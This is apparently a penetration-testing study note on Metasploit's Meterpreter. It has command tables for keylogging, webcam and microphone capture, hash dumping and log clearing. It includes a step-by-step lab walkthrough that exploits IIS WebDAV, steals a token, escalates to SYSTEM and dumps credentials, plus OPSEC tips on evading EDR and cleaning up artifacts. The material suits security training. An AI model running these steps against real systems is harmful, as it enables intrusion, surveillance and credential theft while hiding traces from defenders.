# 11 — Meterpreter

## Overview

Meterpreter is Metasploit's most powerful payload — a multi-faceted, extensible post-exploitation tool that resides entirely in memory. It uses **DLL injection** and **AES-encrypted communications**, leaving minimal forensic evidence on the target.

---

## Design Goals

| Goal | How Meterpreter Achieves It |
|------|----------------------------|
| **Stealthy** | Lives entirely in RAM — nothing written to disk. Injects into existing processes. No new processes created. All comms AES-encrypted |
| **Powerful** | Channelized communication. Hash dumping, token stealing, keylogging, screenshotting, pivoting — all built-in |
| **Extensible** | Extensions loaded dynamically at runtime over the network. Modular — add features without rebuilding |

---

## How Meterpreter Initializes

```
1. Target executes the initial stager (bind/reverse/findtag/passivex)
2. Stager loads the Reflective DLL → handles DLL injection
3. Meterpreter core initializes → establishes AES-encrypted link → sends GET
4. Metasploit receives GET → configures client
5. Extensions auto-load: stdapi (always) + priv (if admin rights)
```

---

## Key Meterpreter Commands by Category

### Core

| Command | Description |
|---------|-------------|
| `background` / `bg` | Background current session |
| `sessions` | Switch to another session |
| `migrate` | Migrate to another process |
| `load` | Load a Meterpreter extension |
| `run` | Execute a script or post module |
| `irb` | Interactive Ruby shell |
| `sleep` | Go quiet, then re-establish |
| `transport` | Change transport mechanism |
| `exit` / `quit` | Terminate session |

### File System

| Command | Description |
|---------|-------------|
| `ls`, `cd`, `pwd` | Navigate file system |
| `cat` | Read file contents |
| `download` / `upload` | Transfer files |
| `search` | Search for files |
| `edit` | Edit a file |
| `rm`, `rmdir`, `mkdir` | File/directory operations |

### Networking

| Command | Description |
|---------|-------------|
| `ifconfig` / `ipconfig` | Display interfaces |
| `netstat` | Network connections |
| `arp` | ARP cache |
| `portfwd` | Port forwarding |
| `route` | View/modify routing table |

### System

| Command | Description |
|---------|-------------|
| `getuid` | Current user (replaces `whoami`) |
| `sysinfo` | OS and system info |
| `ps` | List running processes |
| `shell` | Drop to OS command shell |
| `execute` | Execute a command |
| `kill` / `pkill` | Terminate processes |
| `reg` | Interact with registry |
| `clearev` | Clear event logs |

### Privilege Escalation

| Command | Description |
|---------|-------------|
| `getsystem` | Attempt SYSTEM-level privileges |
| `steal_token <PID>` | Steal token from a process |
| `getprivs` | Enable all available privileges |
| `hashdump` | Dump SAM database hashes |
| `lsa_dump_sam` | Detailed SAM dump with SIDs |
| `lsa_dump_secrets` | Dump LSA secrets (service passwords, DPAPI keys) |

### User Interface / Surveillance

| Command | Description |
|---------|-------------|
| `screenshot` | Capture desktop screenshot |
| `screenshare` | Real-time desktop viewing |
| `keyscan_start/stop/dump` | Keystroke capture |
| `record_mic` | Record audio |
| `webcam_snap` / `webcam_stream` | Capture webcam |

---

## Process Migration

When initial access gives limited privileges, migrate to a process with higher privileges:

```bash
# List processes — look for SYSTEM or NETWORK SERVICE processes
meterpreter > ps

# Migrate to a more privileged process
meterpreter > migrate <PID>

# Or steal a token from a running process
meterpreter > steal_token <PID>
```

> **Why migrate?** If the exploited process dies, your session dies. Migrating to a stable process (e.g., `svchost.exe`, `w3wp.exe`) ensures persistence.

---

## Full Workflow Example: IIS 6.0 WebDAV (Granny)

### 1. Scan and Exploit

```bash
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15
msf6 > use exploit/windows/iis/iis_webdav_upload_asp
msf6 exploit(...) > set RHOST 10.10.10.15
msf6 exploit(...) > set LHOST tun0
msf6 exploit(...) > run
# Meterpreter session 1 opened
```

### 2. Initial Access — Token Theft

```bash
meterpreter > getuid
# [-] Access is denied

meterpreter > ps
# Find NT AUTHORITY\NETWORK SERVICE process (e.g., PID 1836)

meterpreter > steal_token 1836
# Stolen token with username: NT AUTHORITY\NETWORK SERVICE
```

### 3. Privilege Escalation — Local Exploit Suggester

```bash
meterpreter > bg
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(...) > set SESSION 1
msf6 post(...) > run
# [+] exploit/windows/local/ms15_051_client_copy_image: vulnerable
```

### 4. Escalate to SYSTEM

```bash
msf6 > use exploit/windows/local/ms15_051_client_copy_image
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > set LHOST tun0
msf6 exploit(...) > run
# Meterpreter session 2 opened as NT AUTHORITY\SYSTEM
```

### 5. Dump Credentials

```bash
meterpreter > hashdump
# Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::

meterpreter > lsa_dump_sam
# Detailed SAM dump with RIDs and hashes

meterpreter > lsa_dump_secrets
# LSA secrets — service account passwords, DPAPI keys
```

---

## OPSEC Considerations

| Risk | Detail |
|------|--------|
| **Leftover files** | Exploit may upload `.asp`/`.php` files that fail to delete (403 Forbidden) |
| **File name patterns** | `metasploit%RAND%.asp` — defenders can regex match these |
| **Process injection** | Meterpreter injects into processes — EDR may flag this |
| **Solution** | Migrate quickly, clean up artifacts, use staged payloads |

---

## Key Takeaways

| Concept | Remember |
|---------|----------|
| **Memory-only** | Meterpreter lives in RAM — no disk artifacts |
| **AES-encrypted** | All communications encrypted since MSF v6 |
| **`getuid` not `whoami`** | Meterpreter has its own command set |
| **`steal_token` + `migrate`** | Two ways to escalate within a session |
| **`local_exploit_suggester`** | First tool to run when you need privesc |
| **`hashdump` + `lsa_dump_sam/secrets`** | Extract all credential material as SYSTEM |
| **`shell` drops to OS CLI** | Opens a channel to cmd.exe/bash |
| **Background with `bg`, not `Ctrl+C`** | Keep the session alive |
| **Clean up artifacts** | Exploits may leave files — delete them manually if auto-delete fails |
